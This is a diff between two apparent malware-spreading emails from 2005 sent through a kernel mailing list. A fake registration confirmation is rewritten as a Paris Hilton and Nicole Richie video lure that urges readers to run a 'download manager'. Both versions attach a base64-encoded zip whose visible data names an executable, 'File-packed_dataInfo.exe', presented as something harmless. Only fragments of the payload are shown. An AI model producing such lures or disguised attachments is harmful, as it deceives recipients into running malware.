@@ -1,29 +1,30 @@
-From: postman@lists.ed.ac.uk
-Subject: Registration Confirmation
-Date: Fri, 23 Dec 2005 15:49:10 UTC
-Message-ID: <bb8448de5cf.e49f90cb@lists.ed.ac.uk>
+From: hostmaster@lugbih.org
+Subject: Paris Hilton & Nicole Richie
+Date: Fri, 23 Dec 2005 17:06:29 UTC
+Message-ID: <5ea11e.fa925cc79@lugbih.org>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="======d355bdad1.727fdc4ea1db"
+Content-Type: multipart/mixed; boundary="=3c48feee40.f60283e5e2"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: x-Recipient@oss.sgi.com
+To: priv-mail3785@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---======d355bdad1.727fdc4ea1db
+--=3c48feee40.f60283e5e2
 
-Protected message is attached!
+The Simple Life:
 
+View Paris Hilton & Nicole Richie video clips , pictures & more ;)
+Download is free until Jan, 2006!
 
-***** Go to: http://www.lists.ed.ac.uk
-***** Email: postman@lists.ed.ac.uk
---======d355bdad1.727fdc4ea1db
-Content-Type: application/octet-stream; name=reg_pass.zip
+Please use our Download manager.
+--=3c48feee40.f60283e5e2
+Content-Type: application/octet-stream; name=downloadm.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass.zip"
+Content-Disposition: attachment; filename="downloadm.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1001,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---======d355bdad1.727fdc4ea1db--
+--=3c48feee40.f60283e5e2--
